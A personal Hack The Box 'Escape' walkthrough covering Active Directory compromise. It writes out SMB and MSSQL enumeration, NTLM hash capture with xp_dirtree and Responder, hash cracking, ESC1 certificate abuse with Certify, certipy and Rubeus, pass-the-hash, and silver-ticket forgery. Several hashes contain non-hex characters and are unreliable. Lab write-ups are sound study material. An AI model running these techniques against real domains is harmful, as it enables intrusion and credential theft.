`nmap -sC -sV -oA nmap/escape 10.10.11.202`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[Pasted image 20241216202452.png]]
This is probably a windows active directory box..
LDAP leaking domain name as `sequel.htb` and alternative name as `dc.sequel.htb`

Add this to `/etc/hosts`

![[Pasted image 20241216202835.png]]
**Quick tip**: perform ssl handshake in a web browser using a high number port

![[Pasted image 20241216203128.png]]
Hit view the certificate and see the common name is `sequel-DC-CA`
![[Pasted image 20241216203240.png]]
Looking at #smb with #crackmapexec 

`crackmapexec smb 10.10.11.202`

![[Pasted image 20241216203557.png]]

`crackmapexec smb 10.10.11.202 --shares`

![[Pasted image 20241216203639.png]]

If you see this error, try inputting a fake username and blank password:

`cme smb 10.10.11.202 -u 'DoesNotExist' -p '' --shares`

![[Pasted image 20241216203920.png]]
Alternate tool to #crackmapexec is #smbclient to enumerate shares

`smbclient -L //10.10.11.202`

![[Pasted image 20241216204043.png]]
Going into `Public` share because not a default share & says public...

`smbclient //10.10.11.202/Public`

`dir`

Discover `Server Procedures.pdf`

![[Pasted image 20241216204306.png]]
Download the file.

Open the file. 

Discover credentials. 

![[Pasted image 20241216204407.png]]
First trying to use the creds to redo some of the cme smb commands. 


![[Pasted image 20241216204654.png]]
Nothing helpful.

Try connecting to mssql and winrm (fails)

`cme mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCanWrite1'`

![[Pasted image 20241216205701.png]]
There are two types of authentication for microsoft sql so trying other method `--local-auth`

`cme mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCanWrite1'`

![[Pasted image 20241216205928.png]]
So these creds will log us in. 

Add `-L` to list modules available 

`cme mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCanWrite1' -L`

![[Pasted image 20241216210044.png]]
Trying out `mssql_priv` module 

`cme mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCanWrite1' -M mssql_priv

No more info..so module failed?
![[Pasted image 20241216210229.png]]
Using #impacket `mssqlclient.py`

`mssqlclient.py publicuser:GuestUserCantWritel@sequel.htb

This werks! whoop

![[Pasted image 20241216210546.png]]
run `help` to get list of commands 

`xp_cmdshell whoami` - don't have perms to run this

![[Pasted image 20241216210708.png]]

trying to enable perms with `enable_xp_cmdshell` - didn't work

![[Pasted image 20241216210814.png]]

Use `xp_dirtree` to request a file off an smb share in order to intercept the hash of the user running mssql 

Using `xp_dirtree` to mount a fake share and starting up responder over the vpn interface. 

`xp_dirtree \\10.10.14.8\fake\share`

`sudo responder -I tun0`
![[Pasted image 20241216211148.png]]
Andd got the sql service cred. 

![[Pasted image 20241216211319.png]]
Crack this hash using #hashcat 

this is an #ntlmv2 hash

Hashcat should auto detect the mode. 

![[Pasted image 20241216211513.png]]
Using rockyou.txt wordlist 

It crackedddd. 

![[Pasted image 20241216211559.png]]
Try logging in with the creds `sql_svc:REGGIE1234ronnie`

Using #crackmapexec try connecting to #smb & #winrm

Connection to winrm worked. 

`cme smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'`
![[Pasted image 20241217181512.png]]
`cme winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'`

Install #evilwinrm 

Gain initial access with #evilwinrm 

`evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie`

![[Pasted image 20241217184725.png]]
Remember this has a certificate authority...

cd into program data and drop `Certify.exe` there from #SharpCollection #sharphound 

using winrm.

`cp Certify.exe ~/htb/escape`

`upload Certify.exe`

![[Pasted image 20241217185139.png]]
`Certify.exe` has a `find /vulnerable` flag so let's run that..

`.\certify.exe find /vulnerable`

![[Pasted image 20241217185333.png]]
No vulnerable cert templates found 

![[Pasted image 20241217185426.png]]
Next move...check sql error logs

`cd SQLServer\Logs`

`type ERRORLOG.BAK`

Gain some new user credentials from looking at failed login attempts. 

![[Pasted image 20241217190030.png]]
Going back to #crackmapexec to test out these creds.

`cme smb 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3` 

No matter what cme will say these creds worked, but if it doesn't say "pwned" we got nothing. 

`cme winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3` 

Pwn3d! through winrm!

![[Pasted image 20241217190344.png]]
If this didn't work would've tried #RunAsCs tool from initial access shell. 

https://github.com/antonioCoco/RunasCs

Login using #evilwinrm with new found creds 

`evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3`

![[Pasted image 20241217190816.png]]
Going back to `C:\programdata` and running `Certify.exe` again.

`.\certify.exe find /vulnerable`

SQL-SVC user didn't have the permissions that this cert required to gather all the data 

The `UserAuthentication` template is vulnerable. 

![[Pasted image 20241217191116.png]]

Go to certify github page to see which scenario we have. 

https://github.com/ghostpack/certify

We can do the third scenario from this page. 

![[Pasted image 20241217203639.png]]

We will customize this:
```
C:\Temp>Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
```

First, running `net user` to get admin name `Administrator`

![[Pasted image 20241217203932.png]]
```
C:\Temp>Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
Now we can use this ticket to authenticate as administrator 

![[Pasted image 20241217204310.png]]
Copy and paste the cert into new file `cert.pem`

Use provided openssl command to create a `.pfx` file

![[Pasted image 20241217204428.png]]

Upload #D^rubeus to remote machine from #SharpCollection 

![[Pasted image 20241217204850.png]]
Upload certificate 

`upload cert.pfx`

![[Pasted image 20241217204940.png]]
Execute Rubeus 

`.\Rubeus.exe asktgt/user:administrator /certificate:C:\programdata\cert.pfx`

![[Pasted image 20241217205137.png]]
Got the tgt 

![[Pasted image 20241217205239.png]]
`dir C:\Users\administrator` - don't have access.

Failed to inject cert into our session. 

Get NTLM hash with:

`.\Rubeus.exe asktgt/user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap`

![[Pasted image 20241217205456.png]]
Could also take ticket and use psexec to login. 
We can also login with this NTLM hash. 

`cme smb 10.10.11.202 -u administrator -H A52F7BESGJGDGGSG7248476`

This worked. 

![[Pasted image 20241217205723.png]]

Login with #psexec 

`psexec.py -hashes A52F7BESGJGDGGSG7248476:A52F7BESGJGDGGSG7248476 administrator@10.10.11.202`

Just paste the NTLM hash twice. Got root. 
![[Pasted image 20241217210000.png]]

Alternate method to get in using #certipy 

This command will also show us vulnerable certificates

`certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable`

![[Pasted image 20241217210318.png]]
![[Pasted image 20241217210419.png]]

Requesting a certificate and this should give us a `.pfx` file

`certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication`

![[Pasted image 20241217210845.png]]
Surprised this worked bc dates were out of sync with DC. 

Now request #TGT 

`certipy auth -pfx administrator.pfx`

Okay this fails because of clock skew. 

![[Pasted image 20241217211540.png]]
Run 

`sudo ntpdate 10.10.11.202` to sync time with DC

Rerun `certipy auth -pfx administrator.pfx`

and it works. 

![[Pasted image 20241217211804.png]]
Got NTLM hash for the user. 

`aad3b` is just a blank hash.

Now let's go the #silverticket route 

How to forge #TGS tickets (Ticket Granting Service)

You can only use a #TGT with the domain controller. 

How Kerberos works:
![[Pasted image 20241217212240.png]]
1. Need these creds sql_svc `REGGIE1234ronnie` to create NTLM hash because the mssql server only knows NTLM hashes
2. Need domain SID

1. Creating NTLM hash in python...

![[Pasted image 20241217212740.png]]


2. Grabbing domain SID

![[Pasted image 20241217212922.png]]

Now creating the  #silverticket#tgs with `ticketer.py` from #impacket which lets us login to MSSQL as admin 

`ticketer.py -nthash 1443ec19dgdisidsjiweiu -domain-sid S-1-5-21-40784794743-6326754232-23426735 -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator` 

![[Pasted image 20241217213434.png]]
then do this 

![[Pasted image 20241217213543.png]]
then do this 

![[Pasted image 20241217213615.png]]
then we can run `enable_xp_cmdshell`

![[Pasted image 20241217213725.png]]

then run this 

![[Pasted image 20241217213847.png]]

^ there's the admin hash 

Search for payloadallthethings eop file write to see if we can write a file as admin. 

Search powerupsql bulkinsert write file 

https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql

